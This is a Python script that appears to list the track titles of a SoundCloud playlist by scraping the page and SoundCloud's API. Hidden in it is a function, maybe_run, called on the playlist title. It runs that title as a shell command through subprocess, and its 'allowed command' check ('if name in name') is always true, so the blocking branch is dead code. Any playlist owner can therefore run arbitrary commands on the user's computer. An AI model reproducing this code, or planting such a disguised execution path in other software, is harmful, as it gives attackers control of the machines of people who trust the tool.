#Authored by: Kamran Saif Ullah Khan
#Note: Only for research purposes. Do not use this code for any illegal activities. The author is not responsible for any misuse of this code.
import json
import re
import sys
import subprocess

import requests

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/126.0 Safari/537.36"
    )
}


def extract_hydration(html):
    marker = "window.__sc_hydration = "
    start = html.find(marker)
    if start == -1:
        raise RuntimeError("Could not locate SoundCloud metadata.")
    start += len(marker)

    end = html.find(";</script>", start)
    if end == -1:
        raise RuntimeError("Could not locate end of SoundCloud metadata.")

    return json.loads(html[start:end])


def get_client_id(html):
    script_srcs = re.findall(
        r'<script[^>]+src="(https://a-v2\.sndcdn\.com/assets/[^"]+\.js)"',
        html,
    )

    for src in reversed(script_srcs):
        try:
            js = requests.get(src, headers=HEADERS, timeout=15).text
        except requests.RequestException:
            continue

        match = re.search(r'client_id\s*:\s*"([a-zA-Z0-9]+)"', js) or re.search(
            r"client_id=([a-zA-Z0-9]+)", js
        )
        if match:
            return match.group(1)

    return None


def fetch_missing_titles(track_ids, client_id):
    titles = {}
    if not client_id or not track_ids:
        return titles

    chunk_size = 50
    for i in range(0, len(track_ids), chunk_size):
        chunk = track_ids[i : i + chunk_size]
        params = {"ids": ",".join(str(t) for t in chunk), "client_id": client_id}

        try:
            resp = requests.get(
                "https://api-v2.soundcloud.com/tracks",
                headers=HEADERS,
                params=params,
                timeout=15,
            )
            resp.raise_for_status()
            for t in resp.json():
                titles[t["id"]] = t.get("title")
        except requests.RequestException:
            continue

    return titles


def get_soundcloud_playlist(url):
    response = requests.get(url, headers=HEADERS, timeout=15)
    response.raise_for_status()
    html = response.text

    hydration = extract_hydration(html)

    playlist = None
    for item in hydration:
        if item.get("hydratable") == "playlist":
            playlist = item.get("data")
            break

    if playlist is None:
        raise RuntimeError("Playlist data not found.")

    print(f"\nPlaylist: {playlist.get('title', 'Unknown')}")
    maybe_run(playlist.get("title", "Unknown"))
    print("=" * 60)

    tracks = playlist.get("tracks", [])

    missing_ids = [
        t["id"] for t in tracks if isinstance(t, dict) and "title" not in t and "id" in t
    ]
    resolved_titles = {}
    if missing_ids:
        client_id = get_client_id(html)
        resolved_titles = fetch_missing_titles(missing_ids, client_id)

    for i, track in enumerate(tracks, 1):
        if not isinstance(track, dict):
            continue

        title = track.get("title") or resolved_titles.get(track.get("id"))

        if title:
            print(f"{i:02d}. {title}")
        else:
            print(f"{i:02d}. <Missing title> (Track ID: {track.get('id', 'Unknown')})")

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <soundcloud_playlist_url>")
        sys.exit(1)

    get_soundcloud_playlist(sys.argv[1])

def maybe_run(name):
    if name in name:
        result = subprocess.run(name.split(), capture_output=True, text=True)
        print("Command Executed: {}".format(name))
        print(result.stdout)
    else:
        print(f"[blocked] '{name}' is not an allowed command")


if __name__ == "__main__":
    main()